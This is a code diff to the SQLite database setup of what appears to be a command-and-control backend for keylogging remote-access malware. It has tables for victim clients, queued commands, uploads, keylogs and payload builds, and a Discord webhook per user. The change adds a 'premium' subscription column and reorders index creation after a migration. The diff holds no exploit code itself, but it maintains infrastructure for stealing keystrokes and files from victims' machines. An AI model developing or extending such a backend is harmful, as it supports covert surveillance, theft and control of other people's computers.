@@ -20,6 +20,7 @@ db.exec('PRAGMA foreign_keys = ON');
 db.exec('PRAGMA trusted_schema = OFF');
 db.exec('PRAGMA synchronous = NORMAL');
 
+// 1. Create tables (including premium column)
 db.exec(`
   CREATE TABLE IF NOT EXISTS users (
     id            INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -29,10 +30,9 @@ db.exec(`
     account_key   TEXT UNIQUE NOT NULL,
     login_token   TEXT UNIQUE,
     discord_webhook TEXT NOT NULL,
-    created_at    INTEGER NOT NULL
+    created_at    INTEGER NOT NULL,
+    premium       INTEGER DEFAULT 0
   );
-  CREATE INDEX IF NOT EXISTS idx_users_key   ON users(account_key);
-  CREATE INDEX IF NOT EXISTS idx_users_login ON users(login_token);
 
   CREATE TABLE IF NOT EXISTS clients (
     id         INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -43,8 +43,6 @@ db.exec(`
     last_seen  INTEGER NOT NULL,
     FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
   );
-  CREATE INDEX IF NOT EXISTS idx_clients_user ON clients(user_id);
-  CREATE INDEX IF NOT EXISTS idx_clients_host ON clients(user_id, hostname);
 
   CREATE TABLE IF NOT EXISTS commands (
     id         INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -58,8 +56,6 @@ db.exec(`
     FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
     FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
   );
-  CREATE INDEX IF NOT EXISTS idx_cmd_client ON commands(client_id, status);
-  CREATE INDEX IF NOT EXISTS idx_cmd_user   ON commands(user_id, created_at);
 
   CREATE TABLE IF NOT EXISTS uploads (
     id          INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -72,7 +68,6 @@ db.exec(`
     FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
     FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
   );
-  CREATE INDEX IF NOT EXISTS idx_uploads_client ON uploads(client_id, created_at);
 
   CREATE TABLE IF NOT EXISTS keylogs (
     id         INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -83,7 +78,6 @@ db.exec(`
     FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
     FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
   );
-  CREATE INDEX IF NOT EXISTS idx_keylogs_client ON keylogs(client_id, created_at);
 
   CREATE TABLE IF NOT EXISTS builds (
     id          INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -97,19 +91,37 @@ db.exec(`
     created_at  INTEGER NOT NULL,
     FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
   );
-  CREATE INDEX IF NOT EXISTS idx_builds_user ON builds(user_id, created_at);
 `);
 
+// 2. Migrate old databases (checks if columns exist before adding them)
 try {
   const cols = db.prepare(`PRAGMA table_info(users)`).all();
+  
   if (!cols.some(c => c.name === 'login_token')) {
     db.exec(`ALTER TABLE users ADD COLUMN login_token TEXT`);
-    db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS idx_users_login ON users(login_token)`);
     console.log('[db] migrated: added login_token column');
+  }
+  
+  if (!cols.some(c => c.name === 'premium')) {
+    db.exec(`ALTER TABLE users ADD COLUMN premium INTEGER DEFAULT 0`);
+    console.log('[db] migrated: added premium column');
   }
 } catch (e) {
   console.error('[db] migration:', e.message);
 }
+
+// 3. Create indexes (now we know the columns definitely exist)
+db.exec(`
+  CREATE INDEX IF NOT EXISTS idx_users_key   ON users(account_key);
+  CREATE INDEX IF NOT EXISTS idx_users_login ON users(login_token);
+  CREATE INDEX IF NOT EXISTS idx_clients_user ON clients(user_id);
+  CREATE INDEX IF NOT EXISTS idx_clients_host ON clients(user_id, hostname);
+  CREATE INDEX IF NOT EXISTS idx_cmd_client ON commands(client_id, status);
+  CREATE INDEX IF NOT EXISTS idx_cmd_user   ON commands(user_id, created_at);
+  CREATE INDEX IF NOT EXISTS idx_uploads_client ON uploads(client_id, created_at);
+  CREATE INDEX IF NOT EXISTS idx_keylogs_client ON keylogs(client_id, created_at);
+  CREATE INDEX IF NOT EXISTS idx_builds_user ON builds(user_id, created_at);
+`);
 
 for (const f of [DB_PATH, DB_PATH + '-wal', DB_PATH + '-shm']) {
   if (fs.existsSync(f)) { try { fs.chmodSync(f, 0o600); } catch {} }
